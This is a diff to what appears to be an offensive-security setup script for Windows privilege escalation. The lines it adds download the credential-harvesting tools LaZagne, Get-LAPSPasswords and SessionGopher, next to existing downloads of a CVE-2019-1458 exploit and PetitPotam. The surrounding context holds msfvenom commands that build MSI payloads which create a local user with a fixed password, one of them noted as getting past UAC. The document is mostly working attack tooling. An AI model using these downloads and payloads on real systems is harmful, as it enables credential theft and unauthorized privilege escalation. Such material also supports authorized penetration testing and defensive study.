@@ -41,6 +41,9 @@
 # - Powerless.bat
 # - ADACLScan.ps1
 # - PetitPotam.exe
+# - LaZagne.exe
+# - Get-LAPSPasswords.ps1
+# - SessionGopher.ps1
 
 #sudo apt install -y powersploit peass windows-binaries
 
@@ -128,6 +131,9 @@ wget https://github.com/rip1s/CVE-2019-1458/raw/master/x64/Release/cve-2019-1458
 wget https://github.com/gladiatx0r/Powerless/raw/master/Powerless.bat
 wget https://github.com/canix1/ADACLScanner/releases/download/7.9/ADACLScan.ps1
 wget https://github.com/topotam/PetitPotam/raw/main/PetitPotam.exe
+wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
+wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
+wget https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
 
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi-nouac -o alwe-nouac.msi #No uac format
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
